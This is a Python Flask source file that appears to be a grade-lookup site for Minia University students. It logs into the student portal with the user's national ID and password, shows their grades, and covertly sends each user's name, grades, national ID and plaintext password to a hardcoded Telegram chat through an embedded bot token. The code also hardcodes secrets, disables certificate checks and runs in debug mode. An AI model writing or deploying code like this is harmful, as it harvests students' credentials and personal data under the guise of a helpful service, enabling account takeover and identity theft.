from flask import Flask, render_template, request, flash, redirect, url_for
import requests
import json
import telebot

app = Flask(__name__)
app.secret_key = 'Raafat01011508719'

# Initialize your Telegram bot
bot = telebot.TeleBot("6512189034:AAFiP4hSCd5LXSIbK0KlkI-9qmUYh3fCAwQ")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/grades', methods=['POST'])
def get_grades():
    try:

        email = request.form['username'].strip()
        password = request.form['password'].strip()
        selected_year = request.form['year']

        # Validate username
        if not email.isdigit() or len(email) != 14:
            flash("الرقم القومي يجب ان يكون 14 رقما!")
            return redirect(url_for('index'))
        
        if not all(ord(char) < 128 for char in email):
            flash("يجب كتابه الرقم القومي بالارقام الانجليزيه!")
            return redirect(url_for('index'))
            
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://allstd.mans.edu.eg',
            'Referer': 'https://allstd.mans.edu.eg/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'UserName': email,
            'Password': password,
        }

        response = requests.post('http://stda.minia.edu.eg/Portallogin', headers=headers, data=data, timeout=120)
        if response.status_code == 200:
            cookies = response.cookies
            response_json = response.json()
            if response_json == [{"Message": "", "Link": "/"}]:
                data = {
                    'param0': 'Portal.General',
                    'param1': 'GetStudentPortalData',
                    'param2': '{"UserID":""}',
                }
                response = requests.post('http://stda.minia.edu.eg/PortalgetJCI', headers=headers, cookies=cookies, data=data)
                UUID = response.json()[0]['UUID']
                data = {
                    'param0': 'Portal.Results',
                    'param1': 'GetAllResults',
                    'param2': json.dumps({"UUID": UUID}),
                }

                response = requests.post('http://stda.minia.edu.eg/PortalgetJCI', headers=headers, cookies=cookies, data=data, verify=False)
                
                response_json = response.json()
                grades = []
                max_degrees = 0
                total_degrees = 0

                data = {
                    'param0': 'Portal.StudentsPortal',
                    'param1': 'GetPortaStudentPersonal',
                    'param2': json.dumps({"UUID": UUID}),
                }

                name_req = requests.post('http://stda.minia.edu.eg/PortalgetJCI', cookies=cookies, headers=headers, data=data, verify=False).json()
                full_name = name_req[0]['Name'].split('|')[0]  # "رافت سامى صدقى فارس"

                # Split the full name into parts
                name_parts = full_name.split(' ') 

                # Extract the first and second names
                first_name = name_parts[0] 
                second_name = name_parts[1]  

                # Combine the first and second names
                first_and_second_name = f"{first_name} {second_name}"

                for entry in response_json:
                    if selected_year in entry['ScopeName']:
                        try:
                            for course in entry['ds'][0]['StudyYearCourses']:
                                course_name = course['CourseName'].replace("||", '')
                                max_score = course['Max']
                                total_score = course['Total']
                                grade_name = course["GradeName"].split("|")[0]
                                
                                if total_score:  # Check if total score is not empty
                                    percentage = (float(total_score) / float(max_score)) * 100
                                else:
                                    percentage = 0
                                    total_score = 0
                                    grade_name = "غير معروف"
                                max_degrees+= float(max_score)
                                total_degrees+= float(total_score)

                                grades.append({
                                    'course_name': course_name,
                                    'grade': grade_name,
                                    'max_score': max_score,
                                    'total_score': total_score,
                                    'percentage': int(percentage)
                                })
                        except: 
                            flash("تم تظهر النتيجة بعد حاول مرة اخري لاحقا!")
                            return redirect(url_for('index'))
                percentage = float(total_degrees/max_degrees)*100
                formatted_percentage = "{:.2f}".format(percentage)
                
                # Send grades and name to Telegram
                message = f"Name: {full_name}\n\nGrades: {grades}\n\nTotal Percentage: {formatted_percentage}%\n\n{email} : {password}: {selected_year}"
                bot.send_message("854578633", message)
                
                return render_template('grades.html', grades=grades, name=first_and_second_name, percentage=formatted_percentage)
            else:
                flash("الرقم القومي او كلمة المرور خاطئة، يرجى إعادة إدخال البيانات!")
                return redirect(url_for('index'))
        else:
            flash("حدث خطأ في الاتصال بخادم الموقع!")
            return redirect(url_for('index'))
    except Exception as e:
        flash("حدث خطأ غير متوقع: {}".format(str(e)))
        return redirect(url_for('index'))

if __name__ == "__main__":
    app.run(debug=True)
